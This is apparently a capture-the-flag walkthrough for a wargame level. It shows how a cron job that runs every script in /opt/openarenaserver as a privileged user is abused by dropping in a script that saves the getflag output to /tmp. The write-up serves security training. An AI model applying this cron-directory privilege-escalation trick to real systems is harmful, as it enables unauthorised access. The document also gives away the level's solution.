# Level 05

## step 1 : read mail
```
$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
cron syntax : launch "sh /usr/sbin/openarenaserver" every 2 minutes

## step 2 : analyze /usr/sbin/openarenaserver
```
$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

## step 3 : run getflag with /usr/sbin/openarenaserver
 - Put a script to get the output of getflag in the folder /opt/openarenaserver/
```
$ echo 'getflag > /tmp/flag.out' > /opt/openarenaserver/test.sh
```

- wait for cron to run the script

- read the output
```
$ cat /tmp/flag.out
```
